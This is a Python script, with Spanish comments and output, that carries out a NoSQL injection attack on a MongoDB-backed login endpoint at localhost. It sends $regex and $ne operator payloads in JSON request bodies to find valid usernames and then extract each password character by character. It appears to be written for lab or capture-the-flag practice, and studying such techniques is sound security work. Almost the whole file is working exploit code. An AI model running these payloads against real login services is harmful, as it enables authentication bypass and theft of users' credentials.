#!/usr/bin/python3

import requests, signal, json, pdb, string, sys, time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = string.ascii_letters + string.digits
main_url = "http://localhost:4000/user/login"

def getUsers():

    headers = {'Content-Type': 'application/json'}

    users = []

    for first_character in characters:
        for second_character in characters:

            post_data = '{"username":{"$regex":"^%s%s"},"password":{"$ne":"pepe"}}' % (first_character, second_character)

            r = requests.post(main_url, data=post_data, headers=headers)

            if "Invalid username or password." not in r.text:
                response = json.loads(r.text)
                print("\n[+] El usuario %s es un usuario vÃ¡lido" % response['username'])
                users.append(response['username'])
            
    return users

def getLengthPassword(user):

    headers = {'Content-Type': 'application/json'}

    for digit in range(1, 50):
        post_data = '{"username":"%s","password":{"$regex":".{%d}"}}' % (user, digit)

        r = requests.post(main_url, data=post_data, headers=headers)
        
        if "Invalid username or password." in r.text:
            password_length = digit-1
            return password_length

def getPasswords(users):

    headers = {'Content-Type': 'application/json'}

    for user in users:

        password = ""

        passwordLength = getLengthPassword(user)

        for position in range(0, passwordLength):
            for character in characters:

                post_data = '{"username":"%s","password":{"$regex":"^%s%s"}}' % (user,password,character)

                r = requests.post(main_url, data=post_data, headers=headers)

                if "Invalid username or password." not in r.text:

                    password += character
                    break

        print("\n[+] La contraseÃ±a para el usuario %s es %s" % (user, password))

if __name__ == '__main__':

    users = getUsers()
    getPasswords(users)
